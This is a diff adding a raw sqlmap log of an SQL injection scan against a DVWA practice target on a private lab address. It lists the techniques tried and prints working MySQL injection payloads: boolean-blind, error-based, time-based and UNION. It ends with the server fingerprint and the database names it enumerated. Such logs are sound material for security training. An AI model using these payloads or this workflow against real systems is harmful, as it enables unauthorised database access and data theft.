@@ -1,0 +1,89 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.9#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:35:46 /2025-10-13/
+
+[09:35:46] [INFO] parsing HTTP request from 'request.txt'
+[09:35:46] [INFO] testing connection to the target URL
+[09:35:47] [INFO] testing if the target URL content is stable
+[09:35:47] [INFO] target URL content is stable
+[09:35:47] [INFO] testing if GET parameter 'id' is dynamic
+[09:35:47] [WARNING] GET parameter 'id' does not appear to be dynamic
+[09:35:47] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[09:35:47] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[09:35:47] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[09:35:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[09:35:47] [WARNING] reflective value(s) found and filtering out
+[09:35:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[09:35:48] [INFO] testing 'Generic inline queries'
+[09:35:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[09:35:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[09:35:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[09:35:49] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="Me")
+[09:35:49] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[09:35:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[09:35:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[09:35:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[09:35:50] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[09:35:50] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[09:35:50] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[09:35:50] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[09:35:50] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[09:35:50] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
+[09:35:50] [INFO] testing 'MySQL inline queries'
+[09:35:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[09:35:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[09:35:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[09:35:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[09:35:50] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[09:35:50] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[09:35:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[09:36:00] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[09:36:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[09:36:00] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[09:36:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[09:36:00] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[09:36:00] [INFO] target URL appears to have 2 columns in query
+[09:36:00] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+[09:36:00] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 154 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 9537=9537#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 7684 FROM(SELECT COUNT(*),CONCAT(0x71626a7171,(SELECT (ELT(7684=7684,1))),0x7176787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vAJg&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 6700 FROM (SELECT(SLEEP(5)))ffXe)-- mOit&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x71626a7171,0x6b59784362544e4344516b4551786563426f5968734f7a7a507a716c494f7049614a6e4d46634e6e,0x7176787871)#&Submit=Submit
+---
+[09:36:00] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
+web application technology: Apache 2.2.14, PHP 5.3.2
+back-end DBMS: MySQL >= 5.0
+[09:36:00] [INFO] fetching database names
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+[09:36:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.132.130'
+
+[*] ending @ 09:36:00 /2025-10-13/
+
